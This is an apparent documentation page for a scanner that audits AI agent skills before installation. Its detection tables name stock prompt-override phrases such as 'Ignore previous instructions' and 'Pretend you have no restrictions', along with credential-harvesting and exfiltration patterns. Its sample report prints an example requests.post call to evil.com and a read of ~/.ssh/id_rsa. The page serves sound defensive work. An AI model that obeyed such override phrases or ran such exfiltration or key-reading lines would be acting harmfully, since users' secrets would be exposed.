---
title: "Skill Security Auditor â€” Agent Skill for Codex & OpenClaw"
description: "Security audit and vulnerability scanner for AI agent skills before installation. Use when: (1) evaluating a skill from an untrusted source, (2)."
---

# Skill Security Auditor

<div class="page-meta" markdown>
<span class="meta-badge">:material-rocket-launch: Engineering - POWERFUL</span>
<span class="meta-badge">:material-identifier: `skill-security-auditor`</span>
<span class="meta-badge">:material-github: <a href="https://github.com/Patasse97/claude-skills/tree/main/engineering/skill-security-auditor/SKILL.md">Source</a></span>
</div>

<div class="install-banner" markdown>
<span class="install-label">Install:</span> <code>claude /plugin install engineering-advanced-skills</code>
</div>


Scan and audit AI agent skills for security risks before installation. Produces a
clear **PASS / WARN / FAIL** verdict with findings and remediation guidance.

## Quick Start

```bash
# Audit a local skill directory
python3 scripts/skill_security_auditor.py /path/to/skill-name/

# Audit a skill from a git repo
python3 scripts/skill_security_auditor.py https://github.com/user/repo --skill skill-name

# Audit with strict mode (any WARN becomes FAIL)
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --strict

# Output JSON report
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --json
```

## What Gets Scanned

### 1. Code Execution Risks (Python/Bash Scripts)

Scans all `.py`, `.sh`, `.bash`, `.js`, `.ts` files for:

| Category | Patterns Detected | Severity |
|----------|-------------------|----------|
| **Command injection** | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, backtick execution | ðŸ”´ CRITICAL |
| **Code execution** | `eval()`, `exec()`, `compile()`, `__import__()` | ðŸ”´ CRITICAL |
| **Obfuscation** | base64-encoded payloads, `codecs.decode`, hex-encoded strings, `chr()` chains | ðŸ”´ CRITICAL |
| **Network exfiltration** | `requests.post()`, `urllib.request`, `socket.connect()`, `httpx`, `aiohttp` | ðŸ”´ CRITICAL |
| **Credential harvesting** | reads from `~/.ssh`, `~/.aws`, `~/.config`, env var extraction patterns | ðŸ”´ CRITICAL |
| **File system abuse** | writes outside skill dir, `/etc/`, `~/.bashrc`, `~/.profile`, symlink creation | ðŸŸ¡ HIGH |
| **Privilege escalation** | `sudo`, `chmod 777`, `setuid`, cron manipulation | ðŸ”´ CRITICAL |
| **Unsafe deserialization** | `pickle.loads()`, `yaml.load()` (without SafeLoader), `marshal.loads()` | ðŸŸ¡ HIGH |
| **Subprocess (safe)** | `subprocess.run()` with list args, no shell | âšª INFO |

### 2. Prompt Injection in SKILL.md

Scans SKILL.md and all `.md` reference files for:

| Pattern | Example | Severity |
|---------|---------|----------|
| **System prompt override** | "Ignore previous instructions", "You are now..." | ðŸ”´ CRITICAL |
| **Role hijacking** | "Act as root", "Pretend you have no restrictions" | ðŸ”´ CRITICAL |
| **Safety bypass** | "Skip safety checks", "Disable content filtering" | ðŸ”´ CRITICAL |
| **Hidden instructions** | Zero-width characters, HTML comments with directives | ðŸŸ¡ HIGH |
| **Excessive permissions** | "Run any command", "Full filesystem access" | ðŸŸ¡ HIGH |
| **Data extraction** | "Send contents of", "Upload file to", "POST to" | ðŸ”´ CRITICAL |

### 3. Dependency Supply Chain

For skills with `requirements.txt`, `package.json`, or inline `pip install`:

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Known vulnerabilities** | Cross-reference with PyPI/npm advisory databases | ðŸ”´ CRITICAL |
| **Typosquatting** | Flag packages similar to popular ones (e.g., `reqeusts`) | ðŸŸ¡ HIGH |
| **Unpinned versions** | Flag `requests>=2.0` vs `requests==2.31.0` | âšª INFO |
| **Install commands in code** | `pip install` or `npm install` inside scripts | ðŸŸ¡ HIGH |
| **Suspicious packages** | Low download count, recent creation, single maintainer | âšª INFO |

### 4. File System & Structure

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Boundary violation** | Scripts referencing paths outside skill directory | ðŸŸ¡ HIGH |
| **Hidden files** | `.env`, dotfiles that shouldn't be in a skill | ðŸŸ¡ HIGH |
| **Binary files** | Unexpected executables, `.so`, `.dll`, `.exe` | ðŸ”´ CRITICAL |
| **Large files** | Files >1MB that could hide payloads | âšª INFO |
| **Symlinks** | Symbolic links pointing outside skill directory | ðŸ”´ CRITICAL |

## Audit Workflow

1. **Run the scanner** on the skill directory or repo URL
2. **Review the report** â€” findings grouped by severity
3. **Verdict interpretation:**
   - **âœ… PASS** â€” No critical or high findings. Safe to install.
   - **âš ï¸ WARN** â€” High/medium findings detected. Review manually before installing.
   - **âŒ FAIL** â€” Critical findings. Do NOT install without remediation.
4. **Remediation** â€” each finding includes specific fix guidance

## Reading the Report

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  SKILL SECURITY AUDIT REPORT                â•‘
â•‘  Skill: example-skill                        â•‘
â•‘  Verdict: âŒ FAIL                            â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  ðŸ”´ CRITICAL: 2  ðŸŸ¡ HIGH: 1  âšª INFO: 3    â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ðŸ”´ CRITICAL [CODE-EXEC] scripts/helper.py:42
   Pattern: eval(user_input)
   Risk: Arbitrary code execution from untrusted input
   Fix: Replace eval() with ast.literal_eval() or explicit parsing

ðŸ”´ CRITICAL [NET-EXFIL] scripts/analyzer.py:88
   Pattern: requests.post("https://evil.com/collect", data=results)
   Risk: Data exfiltration to external server
   Fix: Remove outbound network calls or verify destination is trusted

ðŸŸ¡ HIGH [FS-BOUNDARY] scripts/scanner.py:15
   Pattern: open(os.path.expanduser("~/.ssh/id_rsa"))
   Risk: Reads SSH private key outside skill scope
   Fix: Remove filesystem access outside skill directory

âšª INFO [DEPS-UNPIN] requirements.txt:3
   Pattern: requests>=2.0
   Risk: Unpinned dependency may introduce vulnerabilities
   Fix: Pin to specific version: requests==2.31.0
```

## Advanced Usage

### Audit a Skill from Git Before Cloning

```bash
# Clone to temp dir, audit, then clean up
python3 scripts/skill_security_auditor.py https://github.com/user/skill-repo --skill my-skill --cleanup
```

### CI/CD Integration

```yaml
# GitHub Actions step
- name: "audit-skill-security"
  run: |
    python3 skill-security-auditor/scripts/skill_security_auditor.py ./skills/new-skill/ --strict --json > audit.json
    if [ $? -ne 0 ]; then echo "Security audit failed"; exit 1; fi
```

### Batch Audit

```bash
# Audit all skills in a directory
for skill in skills/*/; do
  python3 scripts/skill_security_auditor.py "$skill" --json >> audit-results.jsonl
done
```

## Threat Model Reference

For the complete threat model, detection patterns, and known attack vectors against AI agent skills, see [references/threat-model.md](https://github.com/Patasse97/claude-skills/tree/main/engineering/skill-security-auditor/references/threat-model.md).

## Limitations

- Cannot detect logic bombs or time-delayed payloads with certainty
- Obfuscation detection is pattern-based â€” a sufficiently creative attacker may bypass it
- Network destination reputation checks require internet access
- Does not execute code â€” static analysis only (safe but less complete than dynamic analysis)
- Dependency vulnerability checks use local pattern matching, not live CVE databases

When in doubt after an audit, **don't install**. Ask the skill author for clarification.

